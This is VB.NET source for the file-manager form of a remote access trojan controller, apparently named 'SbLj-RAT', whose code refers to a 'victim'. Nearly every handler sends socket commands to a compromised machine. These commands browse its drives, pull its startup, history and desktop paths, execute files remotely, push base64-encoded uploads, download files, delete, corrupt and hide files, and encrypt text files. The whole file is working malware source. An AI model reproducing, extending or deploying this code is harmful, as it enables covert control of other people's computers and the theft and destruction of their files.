Public Class Filemanager
    Public sock As Integer
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Public yy As String = Form1.YY
    Sub back()

        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.s.Send(sock, "GetDrives" & "||")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If

    End Sub
    Public Sub RefreshList()


        If TextBox1.Text = "" Then
            Me.ListView1.Items.Clear()
            Form1.s.Send(sock, "GetDrives")
        Else
            Me.ListView1.Items.Clear()
            Form1.s.Send(sock, "FileManager" & yy & TextBox1.Text)
        End If


    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getstartuppath")
        Next
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getrecentpath")
        Next
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "gethistorypath")
        Next
    End Sub

    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getdesktoppath")
        Next
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "gettemppath")
        Next
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmydocumentspath")
        Next
    End Sub

    Private Sub Button7_Click(sender As System.Object, e As System.EventArgs) Handles Button7.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmymusicpath")
        Next
    End Sub

    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "getmyimagespath")
        Next
    End Sub


    Private Sub RunToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunToolStripMenuItem.Click
        Form1.s.Send(sock, "Execute||" & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles BackToolStripMenuItem.Click
        back()
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.s.Send(sock, "Rename||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
                Case Else
                    Form1.s.Send(sock, "Rename||File||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "Delete||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.s.Send(sock, "Delete||File||" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub UpToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UpToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Form1.l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "sendfileto" & "||" & TextBox1.Text & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
            RefreshList()
        End If
    End Sub

    Private Sub DownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "downloadfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub OpToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpToolStripMenuItem.Click
        System.Diagnostics.Process.Start(Application.StartupPath & "/SbLj-RAT/Downloads")
    End Sub

    Private Sub DestroyFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DestroyFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "corrupt" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub HideFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HideFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "hidefolderfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShowFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "showfolderfile" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "creatnewfolder" & "||" & TextBox1.Text & n)
        Next
        RefreshList()
    End Sub

    Private Sub PlayMusicInHiddenToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs)
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "playmusic" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub NewTextFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles NewTextFileToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The Text File's Name", "Creat New Text File")
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "creatnewtextfile" & yy & TextBox1.Text & n & ".txt")
        Next
        RefreshList()
    End Sub

    Private Sub ViweeditTextFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViweeditTextFileToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "edittextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CrypteDecryptTextToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CrypteDecryptTextToolStripMenuItem.Click
        If Not (ListView1.FocusedItem.Text.EndsWith(".exe") Or ListView1.FocusedItem.Text.EndsWith(".EXE")) Then
            For Each x As ListViewItem In Form1.l1.SelectedItems
                Form1.s.Send(sock, "cryptedecryptetextfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Next
        Else
            MsgBox("Please Do Not Select an Executable File", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "setaswallpaper" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub ShowPicToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShowPicToolStripMenuItem.Click
        pic1.Visible = True
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "viewimage" & "||" & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub CompressRARToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs)
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "Comrar" & Form1.YY & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub DecToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs)
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "Decrar" & Form1.YY & TextBox1.Text & ListView1.FocusedItem.Text)
        Next
        RefreshList()
    End Sub

    Private Sub Filemanager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        pic1.Visible = False
        Form1.s.Send(sock, "GetDrives" & "||")
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        pic1.Visible = False
    End Sub

    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If

    End Sub

    Private Sub FileInformationToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileInformationToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "fiprop" & yy & TextBox1.Text & ListView1.FocusedItem.Text & yy & "File Folder" & yy & ListView1.FocusedItem.Text) 'folder
            Case Else
                Form1.s.Send(sock, "fiprop" & yy & TextBox1.Text & ListView1.FocusedItem.Text & yy & "File" & yy & ListView1.FocusedItem.Text) 'file 
        End Select



    End Sub
End Class